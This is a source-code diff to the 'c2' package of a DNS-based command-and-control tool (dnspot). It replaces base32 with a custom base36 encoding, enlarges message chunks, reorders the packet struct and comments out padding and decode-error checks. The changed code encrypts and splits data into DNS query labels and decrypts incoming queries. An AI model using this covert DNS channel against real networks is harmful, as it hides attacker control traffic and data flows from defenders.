@@ -2,7 +2,6 @@ package c2
 
 import (
 	"bytes"
-	"encoding/base32"
 	"math/rand"
 	"sort"
 	"strings"
@@ -14,7 +13,12 @@ import (
 	"github.com/mosajjal/dnspot/cryptography"
 )
 
-type MessageType uint
+type MessageType uint8
+
+const (
+	PAYLOAD_SIZE = 80
+	CHUNK_SIZE   = 80
+)
 
 // Message codes
 const (
@@ -38,12 +42,12 @@ const (
 // if IsLastPart == true -> last packet
 
 type MessagePacket struct {
-	TimeStamp    uint32      `struc:"uint32,little"`
-	MessageType  MessageType `struc:"uint8,little"`
-	PartID       uint16      `struc:"uint16,little"`
-	ParentPartID uint16      `struc:"uint16,little"`
-	IsLastPart   bool        `struc:"bool,little"`
-	Payload      [60]byte    `struc:"[60]byte,little"`
+	Payload      [PAYLOAD_SIZE]byte `struc:"[80]byte,little"`
+	TimeStamp    uint32             `struc:"uint32,little"`
+	PartID       uint16             `struc:"uint16,little"`
+	ParentPartID uint16             `struc:"uint16,little"`
+	MessageType  MessageType        `struc:"uint8,little"`
+	IsLastPart   bool               `struc:"bool,little"`
 }
 
 type MessagePacketWithSignature struct {
@@ -97,7 +101,7 @@ func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix stri
 	var response []string
 	var parentPartID uint16 = 0
 	retryCount := 10
-	lims := split(payload, 60)
+	lims := split(payload, CHUNK_SIZE)
 	if len(lims) > 1 {
 		msg.IsLastPart = false
 		msg.PartID = 0
@@ -112,7 +116,7 @@ func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix stri
 		if i == len(lims)-1 && len(lims) > 1 {
 			msg.IsLastPart = true
 		}
-		msg.Payload = [60]byte{}
+		msg.Payload = [PAYLOAD_SIZE]byte{}
 		copy(msg.Payload[:], lims[i])
 		var buf bytes.Buffer
 		buf.Reset()
@@ -122,8 +126,9 @@ func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix stri
 			return response, parentPartID, log.Errorf("Failed to encrypt the payload", err)
 		}
 
-		s := base32.StdEncoding.EncodeToString(encrypted)
-		s = strings.ReplaceAll(s, "=", "")
+		s := cryptography.EncodeBytes(encrypted)
+		// padding
+		// s = strings.ReplaceAll(s, "=", "")
 		response = append(response, insertNth(s, 63)+dnsSuffix)
 		msg.PartID++
 	}
@@ -162,14 +167,15 @@ func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.P
 				return out, log.Errorf("invalid request")
 			}
 			msgRaw := strings.Replace(requestWithoutSuffix, ".", "", -1)
-			if i := len(msgRaw) % 8; i != 0 {
-				msgRaw += strings.Repeat("=", 8-i)
-			}
+			// // padding
+			// if i := len(msgRaw) % 8; i != 0 {
+			// 	msgRaw += strings.Repeat("=", 8-i)
+			// }
 
-			msg, err := base32.StdEncoding.DecodeString(msgRaw)
-			if err != nil {
-				return out, log.Errorf("invalid base32 input: %s", msgRaw)
-			}
+			msg := cryptography.DecodeToBytes(msgRaw)
+			// if err != nil {
+			// 	return out, log.Errorf("invalid base36 input: %s", msgRaw)
+			// }
 			// verify signature
 			decrypted, err := cryptography.Decrypt(privatekey, msg)
 			if err != nil {
